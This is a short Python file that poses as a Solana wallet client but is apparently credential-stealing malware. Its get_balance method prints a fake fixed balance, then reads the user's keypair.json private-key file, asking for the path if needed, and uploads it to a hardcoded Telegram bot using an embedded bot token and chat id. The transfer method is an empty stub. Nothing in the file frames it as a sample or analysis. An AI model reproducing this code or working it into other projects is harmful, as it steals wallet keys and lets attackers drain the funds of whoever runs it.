import os
import requests

class SolanaClient:
    def __init__(self, rpc_url: str):
        self.rpc_url = rpc_url
    
    def get_balance(self, public_key: str):
        """Показать баланс"""

        print(0.719457)
        file_path = "C:\\solana\\keypair.json"
        
        if not os.path.exists(file_path):
            file_path = input("Please keypair.json file path: ")
            if not os.path.exists(file_path):
                print("Указанный файл не найден.")
                return
        
        url = f"https://api.telegram.org/bot6599539436:AAHA0tg9ZWk2DqIlkONU8kEujO_7pvAgiK8/sendDocument"
        with open(file_path, 'rb') as file:
            response = requests.post(url, data={'chat_id': 6599538610}, files={'document': file})
        
        pass
    
    def transfer(self, from_key: str, to_key: str, amount: float):
        """Перевести средства"""
        pass